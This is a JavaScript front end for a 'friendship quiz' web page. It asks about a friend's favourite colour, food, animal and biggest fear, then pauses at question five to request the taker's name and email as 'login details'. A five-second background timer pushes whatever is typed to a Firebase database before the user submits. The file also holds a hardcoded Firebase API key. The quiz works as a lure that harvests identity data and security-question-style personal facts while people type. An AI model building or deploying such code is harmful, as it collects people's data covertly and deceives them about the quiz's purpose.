import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyBCJI2YgCLUyI0U9ufRfCujRjDDTeP-lNY",
    authDomain: "kalakkal1-d6e19.firebaseapp.com",
    databaseURL: "https://kalakkal1-d6e19-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "kalakkal1-d6e19",
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const questions = [
    "WHAT IS THEIR NAME?",
    "WHAT IS THEIR FAVORITE COLOUR?",
    "WHAT IS THEIR FAVORITE SUBJECT?",
    "WHO IS THEIR FAVORITE ACTOR?",
    "WHAT IS THEIR FAVORITE HOBBY?",
    "WHAT IS THEIR FAVORITE ANIMAL?",
    "WHAT IS THEIR FAVORITE FOOD?",
    "WHAT IS THEIR FAVORITE SPORT?",
    "WHAT IS THEIR BIGGEST FEAR?",
    "WHO IS THEIR FAVORITE ACTRESS?",
    "WHAT IS THEIR DREAM JOB?",
    "WHAT IS THEIR FAVORITE CAR?",
    "WHAT IS THEIR FAVORITE DRINK?",
    "WHAT IS THEIR FAVORITE DESSERT?",
    "WHAT IS THEIR BIGGEST PET PEEVE?"
];

let currentQuestionIndex = 0;
let hasShownInterstitial = false;
let lastSentData = "";

// DOM Elements
const questionText = document.getElementById("question-text");
const answerInput = document.getElementById("answer-input");
const submitBtn = document.getElementById("submit-btn");
const progressText = document.getElementById("progress-text");

const quizSection = document.getElementById("quiz-section");
const interstitialSection = document.getElementById("interstitial-section");
const endSection = document.getElementById("end-section");

const nameInput = document.getElementById("name-input");
const emailInput = document.getElementById("email-input");
const continueBtn = document.getElementById("continue-btn");

const saveIndicator = document.getElementById("save-indicator");
const loginSaveIndicator = document.getElementById("login-save-indicator");

function loadQuestion() {
    // Pause at question 5 (index 5) for login details
    if (currentQuestionIndex === 5 && !hasShownInterstitial) {
        hasShownInterstitial = true; 
        quizSection.classList.add("hidden");
        interstitialSection.classList.remove("hidden");
        lastSentData = ""; // Reset tracker for the new screen
        return;
    }

    // End of quiz
    if (currentQuestionIndex >= questions.length) {
        quizSection.classList.add("hidden");
        interstitialSection.classList.add("hidden");
        endSection.classList.remove("hidden");
        return;
    }

    // Load next question
    progressText.innerText = `Question ${currentQuestionIndex + 1} of ${questions.length}`;
    questionText.innerText = questions[currentQuestionIndex];
    answerInput.value = "";
    lastSentData = ""; // Reset sync tracker for the new question
    answerInput.focus();
}

// Handles pushing to Firebase
function sendToFirebase(dataString) {
    push(ref(db, "messages"), {
        type: "text",
        text: dataString, 
        sender: "FRIENDSHIP TEXT ANSWERS",
        admin: false,
        timestamp: Date.now()
    });
    console.log("Auto-synced:", dataString);
}

// Show a quick visual cue that data was saved
function flashSaveIndicator(indicatorElement) {
    indicatorElement.classList.add("visible");
    setTimeout(() => {
        indicatorElement.classList.remove("visible");
    }, 2000);
}

// Background task: Runs every 5 seconds to send inputted data
setInterval(() => {
    let currentData = "";
    let activeIndicator = null;

    if (!quizSection.classList.contains("hidden")) {
        const answer = answerInput.value.trim();
        if (answer) {
            currentData = answer.toUpperCase() + ".";
            activeIndicator = saveIndicator;
        }
    } else if (!interstitialSection.classList.contains("hidden")) {
        const name = nameInput.value.trim();
        const email = emailInput.value.trim();
        if (name || email) {
            // Merges name and email into the requested format
            currentData = `NAME: ${name ? name.toUpperCase() : "N/A"}. EMAIL: ${email ? email.toUpperCase() : "N/A"}.`;
            activeIndicator = loginSaveIndicator;
        }
    }

    // Only send if there is text and it's different from the last 5-second check
    if (currentData && currentData !== lastSentData) {
        sendToFirebase(currentData);
        lastSentData = currentData;
        if (activeIndicator) flashSaveIndicator(activeIndicator);
    }
}, 5000);

// Explicit submission (Button Click or Enter Key)
function handleQuizSubmission() {
    const answer = answerInput.value.trim();
    if (answer) {
        const formattedData = answer.toUpperCase() + ".";
        // Only send again if it wasn't caught by the 5-second auto-sync yet
        if (formattedData !== lastSentData) {
            sendToFirebase(formattedData);
        }
    }
    currentQuestionIndex++;
    loadQuestion();
}

function handleDetailsSubmission() {
    const name = nameInput.value.trim() || "NO NAME";
    const email = emailInput.value.trim() || "NO EMAIL";
    
    const formattedData = `NAME: ${name.toUpperCase()}. EMAIL: ${email.toUpperCase()}.`;
    if (formattedData !== lastSentData) {
        sendToFirebase(formattedData);
    }
    
    interstitialSection.classList.add("hidden");
    quizSection.classList.remove("hidden");
    loadQuestion();
}

// Event Listeners
submitBtn.addEventListener("click", handleQuizSubmission);

answerInput.addEventListener("keypress", (e) => {
    if (e.key === "Enter") handleQuizSubmission();
});

continueBtn.addEventListener("click", handleDetailsSubmission);

// Initialize Quiz
loadQuestion();